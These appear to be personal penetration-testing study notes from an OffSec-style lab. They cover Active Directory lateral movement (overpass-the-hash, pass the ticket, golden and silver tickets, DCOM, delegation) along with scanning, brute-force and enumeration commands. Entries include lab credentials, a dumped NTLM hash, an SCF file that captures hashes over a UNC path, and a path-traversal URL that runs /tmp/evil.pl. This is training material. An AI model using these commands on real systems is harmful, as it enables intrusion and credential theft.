This lateral movement technique also requires the admin share called ADMIN$ to be available. To establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.
----------------------------------
With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).

The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the sekurlsa::pth command from Mimikatz.
-------------------------------
Pass the Ticket
Lateral Movement in Active DirectoryJanuary 20, 2025
here TGT is not flexible because it is a certificate the kerberos wrote about the user and the user need to handle it to the kerberos each time to inspect him the user does not know what is written about him only the kbrtgt
Pass the Ticket
Lateral Movement in Active DirectoryJanuary 20, 2025
while the TGS we have already forged one and it is called silver attack where we mainly need the SPN ntlm. Also here if the TGS for the current use then no administrative needed because we don't need mimikatz to re forge for the current user
Pass the Ticket
Lateral Movement in Active DirectoryJanuary 20, 2025
do not forget all the previous attack ad showing us how to use pth using tools, however here in lateral movement they are showing us these mimikatz because it is like LOL pth techniques which is pass the ticket and over pass the hash
--------------------------
The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows the execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
-------------
At this stage of the engagement, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method.
------------------------------------
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.210.70 -Credential $credential

Enter-PSSession 1
---------------------

RID  : 000003e9 (1001)
User : offsec
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

$username = 'leon';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.210.73 -Credential $credential

Enter-PSSession 1

--------------------------------
HiveNightmare vulnerability, which allows an unprivileged user to read sensitive system files. T
----------------------------------------
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
---------------------------------------
Test-NetConnection -Port 25 192.168.50.8

Unfortunately, with Test-NetConnection we are prevented from fully interacting with the SMTP service. Nevertheless, if not already enabled, we can install the Microsoft version of the Telnet client, as shown:

dism /online /Enable-Feature /FeatureName:TelnetClient

We should note that installing Telnet requires administrative privileges, which could present challenges if we are running as a low-privilege user. However, we could grab the Telnet binary located on another development machine of ours at c:\windows\system32\telnet.exe and transfer it to the Windows machine we are testing from.

telnet 192.168.50.8 25

---------------------------------
echo public > community
echo private >> community
echo manager >> community

for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips

onesixtyone -c community -i ips
-----------------------
[*] resource base constrained delegation is like pass the ticket but for group specific advantage it is also partially relay because when we impersonate we do not provide the usesr to impersonate's data as his data is already in the machine even if we don't have access to it i believe you can do it whenever you have group specific advantage over a workstation and that workstation contains the user you want to impersonate without being able to access his info like using mimikatz but you have Genericall over the workstation

------------------------
[*] when the smb shares of the location 
cat  hutch.offsec/Policies/\{6AC1786C-016F-11D2-945F-00C04fB984F9\}/MACHINE/Registry.pol 
PReg[Software\Policies\Microsoft Services\AdmPwd;AdmPwdEnabled;;;]    is this a password ?

showed that AdmPwdEnabled means with the low priv user using ldap i can see the admin password
-----------------------
"default or safe or vuln or exploit or fuzzer or version or discovery or auth" 
------------------
while IFS= read -r line; do                           
    echo "executed command: $line" 
    rpcclient -U "FMcSorley%CrabSharkJellyfish192" 192.168.173.122 -c "$line"
done < rpccommands.txt
-------------------------
locate responder.db to locate where responder save sessions
--------------------------
[*] get hash to crack - smb writable share allow you to drop scf file to be executed once someone use it 
-------------------------------
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon
IconIndex=1
-----------------------------------
because of my bad enum
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash.txt
/usr/share/wordlists/dirb/big.txt

nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}

nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="vault.offsec",userdb='/home/kali/Desktop/wordlists/seclists/Usernames/Names/names.txt' $IP

sudo nmap -Pn -n $IP -sU --top-ports=100 --reason

./rustscan -a 192.168.173.97  --ulimit 5000


medusa -h 127.0.0.1  -u admin -P /usr/share/wordlists/rockyou.txt   -M http -m AUTH:basic -n 9809

/usr/share/wordlists/metasploit/unix_users.txt
--------------------------------------------------------
ruby username-anarchy -i webnames.txt -f flast,first.last,f.last,last.first > manipusers.txt


http://www.example.com:2000/cgi-bin///////////../../../../../../../../usr/bin/perl?/tmp/evil.pl